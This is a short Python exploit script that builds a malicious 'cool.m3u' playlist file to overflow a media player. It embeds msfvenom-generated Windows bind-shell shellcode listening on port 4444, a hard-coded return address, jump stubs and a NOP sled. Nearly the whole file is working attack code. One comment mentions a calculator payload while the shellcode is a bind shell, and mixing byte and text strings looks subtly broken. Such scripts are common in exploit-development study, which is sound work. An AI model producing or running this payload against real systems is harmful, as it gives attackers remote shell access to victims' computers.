#!/usr/bin/python -w


#Should be run from the root directory
#Little different, here I am only focused on the calc
filename="cool.m3u"
#msfvenom -p windows/shell_bind_tcp LHOST=10.0.2.15 LPORT=4444 -b '\x00\x0A\x0D\xFF' -f pytho
buf1 =  b""
buf1 += b"\xdb\xc0\xbf\x9f\x24\x99\x96\xd9\x74\x24\xf4\x5d\x29"
buf1 += b"\xc9\xb1\x53\x31\x7d\x17\x03\x7d\x17\x83\x5a\x20\x7b"
buf1 += b"\x63\x98\xc1\xf9\x8c\x60\x12\x9e\x05\x85\x23\x9e\x72"
buf1 += b"\xce\x14\x2e\xf0\x82\x98\xc5\x54\x36\x2a\xab\x70\x39"
buf1 += b"\x9b\x06\xa7\x74\x1c\x3a\x9b\x17\x9e\x41\xc8\xf7\x9f"
buf1 += b"\x89\x1d\xf6\xd8\xf4\xec\xaa\xb1\x73\x42\x5a\xb5\xce"
buf1 += b"\x5f\xd1\x85\xdf\xe7\x06\x5d\xe1\xc6\x99\xd5\xb8\xc8"
buf1 += b"\x18\x39\xb1\x40\x02\x5e\xfc\x1b\xb9\x94\x8a\x9d\x6b"
buf1 += b"\xe5\x73\x31\x52\xc9\x81\x4b\x93\xee\x79\x3e\xed\x0c"
buf1 += b"\x07\x39\x2a\x6e\xd3\xcc\xa8\xc8\x90\x77\x14\xe8\x75"
buf1 += b"\xe1\xdf\xe6\x32\x65\x87\xea\xc5\xaa\xbc\x17\x4d\x4d"
buf1 += b"\x12\x9e\x15\x6a\xb6\xfa\xce\x13\xef\xa6\xa1\x2c\xef"
buf1 += b"\x08\x1d\x89\x64\xa4\x4a\xa0\x27\xa1\xbf\x89\xd7\x31"
buf1 += b"\xa8\x9a\xa4\x03\x77\x31\x22\x28\xf0\x9f\xb5\x4f\x2b"
buf1 += b"\x67\x29\xae\xd4\x98\x60\x75\x80\xc8\x1a\x5c\xa9\x82"
buf1 += b"\xda\x61\x7c\x3e\xd2\xc4\x2f\x5d\x1f\xb6\x9f\xe1\x8f"
buf1 += b"\x5f\xca\xed\xf0\x40\xf5\x27\x99\xe9\x08\xc8\xb4\xb5"
buf1 += b"\x85\x2e\xdc\x55\xc0\xf9\x48\x94\x37\x32\xef\xe7\x1d"
buf1 += b"\x6a\x87\xa0\x77\xad\xa8\x30\x52\x99\x3e\xbb\xb1\x1d"
buf1 += b"\x5f\xbc\x9f\x35\x08\x2b\x55\xd4\x7b\xcd\x6a\xfd\xeb"
buf1 += b"\x6e\xf8\x9a\xeb\xf9\xe1\x34\xbc\xae\xd4\x4c\x28\x43"
buf1 += b"\x4e\xe7\x4e\x9e\x16\xc0\xca\x45\xeb\xcf\xd3\x08\x57"
buf1 += b"\xf4\xc3\xd4\x58\xb0\xb7\x88\x0e\x6e\x61\x6f\xf9\xc0"
buf1 += b"\xdb\x39\x56\x8b\x8b\xbc\x94\x0c\xcd\xc0\xf0\xfa\x31"
buf1 += b"\x70\xad\xba\x4e\xbd\x39\x4b\x37\xa3\xd9\xb4\xe2\x67"
buf1 += b"\xe9\xfe\xae\xce\x62\xa7\x3b\x53\xef\x58\x96\x90\x16"
buf1 += b"\xdb\x12\x69\xed\xc3\x57\x6c\xa9\x43\x84\x1c\xa2\x21"
buf1 += b"\xaa\xb3\xc3\x63"



eip="\xe3\xc9\x41\x00" #jump edx pointer
addebx="\x83\xc3\x64"  #add ebx,100
jmpebx="\xff\xe3"      #jmp ebx
buffer="\x90"*8 + addebx  *3+ jmpebx + "A"* 241 +eip + "\x90"*200 + buf1 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
